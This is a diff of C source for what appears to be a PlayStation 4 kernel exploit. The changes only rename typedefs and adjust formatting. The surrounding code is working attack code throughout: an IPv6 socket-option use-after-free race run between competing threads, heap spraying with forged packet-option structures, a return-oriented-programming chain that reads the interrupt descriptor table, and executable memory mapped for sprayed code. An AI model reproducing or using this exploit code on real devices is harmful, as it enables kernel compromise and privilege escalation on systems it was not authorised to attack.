@@ -16,16 +16,17 @@
 #define IPV6_2292PKTINFO 19
 #define IPV6_2292PKTOPTIONS 25
 
-typedef unsigned long long ps4_dword;
-typedef unsigned int ps4_uint;
-typedef volatile int ps4_volatile_int;
+typedef unsigned long long PS4_ULLONG;
+typedef unsigned int PS4_UINT;
+typedef volatile int PS4_VOLAINT;
+
 
 // ps4-rop-8cc generates thread-unsafe code, so each racing thread needs its own get_tclass function
 #define GET_TCLASS(name) int name(int s) {               \
     int v;                                               \
     socklen_t l = sizeof(v);                             \
     if(getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l)) \
-        *(ps4_volatile_int*)0;                               \
+        *(PS4_VOLAINT*)0;                               \
     return v;                                            \
 }
 GET_TCLASS(get_tclass)
@@ -34,7 +35,7 @@ GET_TCLASS(get_tclass_3)
 
 int set_tclass(int s, int val) {
 	if (setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val)))
-		*(ps4_volatile_int*)0;
+		*(PS4_VOLAINT*)0;
 }
 
 const static int TCLASS_MASTER = 0x13370000;
@@ -50,14 +51,14 @@ const static int TCLASS_TAINT = 0x42;
 int get_rthdr(int s, char* buf, int len) {
 	socklen_t l = len;
 	if (getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &l))
-		*(ps4_volatile_int*)0;
+		*(PS4_VOLAINT*)0;
 	return l;
 }
 
 int get_pktinfo(int s, char* buf) {
 	socklen_t l = sizeof(struct in6_pktinfo);
 	if (getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l))
-		*(ps4_volatile_int*)0;
+		*(PS4_VOLAINT*)0;
 	return l;
 }
 
@@ -81,7 +82,7 @@ void* use_thread(void* arg) {
 	*(int*)CMSG_DATA(cmsg) = 0;
 	while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY)
 		if (set_pktopts(o->master_sock, buf, sizeof(buf)))
-			*(ps4_volatile_int*)0;
+			*(PS4_VOLAINT*)0;
 	o->triggered = 1;
 	o->done1 = 1;
 }
@@ -89,7 +90,7 @@ void* use_thread(void* arg) {
 void* free_thread(void* arg) {
 	struct opaque* o = (struct opaque*)arg;
 	while (!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY) {
-		if (free_pktopts(o->master_sock))*(ps4_volatile_int*)0;
+		if (free_pktopts(o->master_sock))*(PS4_VOLAINT*)0;
 		nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
 	}
 	o->triggered = 1;
@@ -108,7 +109,7 @@ void trigger_uaf(struct opaque* o) {
 
 		for (int i = 0; i < 32; i++)
 			if (free_pktopts(o->spray_sock[i]))
-				*(ps4_volatile_int*)0;
+				*(PS4_VOLAINT*)0;
 
 		nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
 	}
@@ -139,28 +140,26 @@ int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long 
 	int tclass;
 	for (;;) {
 		for (int i = 0; i < 32; i++) {
-			*(ps4_dword*)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
-			*(ps4_uint*)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
+			*(PS4_ULLONG*)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
+			*(PS4_UINT*)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
 			if (set_rthdr(o->spray_sock[i], buf, l))
-				*(ps4_volatile_int*)0;
+				*(PS4_VOLAINT*)0;
 		}
 		tclass = get_tclass(o->master_sock);
-		if ((tclass & 0xffff0000) == tclass0)
-			break;
+		if ((tclass & 0xffff0000) == tclass0) break;
 		for (int i = 0; i < 32; i++)
 			if (set_rthdr(o->spray_sock[i], NULL, 0))
-				*(ps4_volatile_int*)0;
+				*(PS4_VOLAINT*)0;
 	}
 	return tclass & 0xffff;
 }
 
-unsigned long long __builtin_gadget_addr(const char*);
-unsigned long long rop_call_funcptr(void(*)(void*), ...);
+PS4_ULLONG __builtin_gadget_addr(const char*);
+PS4_ULLONG rop_call_funcptr(void(*)(void*), ...);
 
-void sidt(ps4_dword* addr, unsigned short* size)
-{
+void sidt(PS4_ULLONG* addr, unsigned short* size) {
 	char buf[10];
-	unsigned long long ropchain[14] = {
+	PS4_ULLONG ropchain[14] = {
 		__builtin_gadget_addr("mov rax, [rdi]"),
 		__builtin_gadget_addr("pop rsi"),
 		ropchain + 13,
@@ -178,7 +177,7 @@ void sidt(ps4_dword* addr, unsigned short* size)
 	};
 	((void(*)(char*))ropchain)(buf);
 	*size = *(unsigned short*)buf;
-	*addr = *(ps4_dword*)(buf + 2);
+	*addr = *(PS4_ULLONG*)(buf + 2);
 }
 
 void (*enter_krop)(void);
@@ -283,13 +282,13 @@ int main() {
 	char* spray_start = spray_bin;
 	char* spray_stop = spray_end;
 	char* spray_map = mmap(
-		0, 
-		spray_stop - spray_start, 
-		PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, 
+		0,
+		spray_stop - spray_start,
+		PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON,
 		-1,
 		0
-	);
-	printf_("spray_map = 0x%llx\n", spray_map);
+	); 
+		printf_("spray_map = 0x%llx\n", spray_map);
 	for (size_t i = 0; i < spray_stop - spray_start; i++)
 		spray_map[i] = spray_start[i];
 
